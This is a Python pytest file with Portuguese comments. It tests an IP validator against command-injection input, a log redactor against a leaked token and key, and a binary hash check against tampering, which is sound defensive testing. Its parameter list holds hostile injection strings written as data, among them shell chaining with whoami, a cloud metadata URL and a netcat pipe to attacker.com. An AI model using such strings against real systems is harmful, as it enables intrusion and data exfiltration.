"""Testes de segurança: Injeção de comandos, path traversal e vazamento de segredos."""

from pathlib import Path
import pytest
from mogged.logging_config import redact_sensitive
from mogged.network.server_validator import is_valid_public_ip
from mogged.security.binary_verify import calculate_sha256, verify_sha256
from mogged.exceptions import IntegrityCheckError


@pytest.mark.parametrize(
    "malicious_ip_input",
    [
        "8.8.8.8; calc.exe",
        "1.1.1.1 && whoami",
        "| nc attacker.com 4444",
        "$(whoami)",
        "`whoami`",
        "127.0.0.1\x00malicious",
        "http://169.254.169.254/",
    ],
)
def test_command_injection_and_url_rejection_in_ip_field(malicious_ip_input):
    # O validador estrito deve rejeitar qualquer string que não seja estritamente um IPv4 público válido
    assert is_valid_public_ip(malicious_ip_input) is False


def test_no_sensitive_secrets_in_logs():
    leak_sample = (
        "Conexão com token=super_secret_token_123456789 e "
        "private_key=-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEA0...-----END RSA PRIVATE KEY----- "
        "com IP 198.51.100.23"
    )
    sanitized = redact_sensitive(leak_sample)

    assert "super_secret_token_123456789" not in sanitized
    assert "MIIEowIBAAKCAQEA0" not in sanitized
    assert "198.51.100.23" not in sanitized


def test_tampered_binary_fails_closed(tmp_path: Path):
    target = tmp_path / "target.exe"
    target.write_bytes(b"ORIGINAL_VALID_CODE")
    valid_hash = calculate_sha256(target)

    # Adulterar o binário (injetar payload)
    target.write_bytes(b"ORIGINAL_VALID_CODE_WITH_INJECTED_MALWARE")

    with pytest.raises(IntegrityCheckError):
        verify_sha256(target, valid_hash)
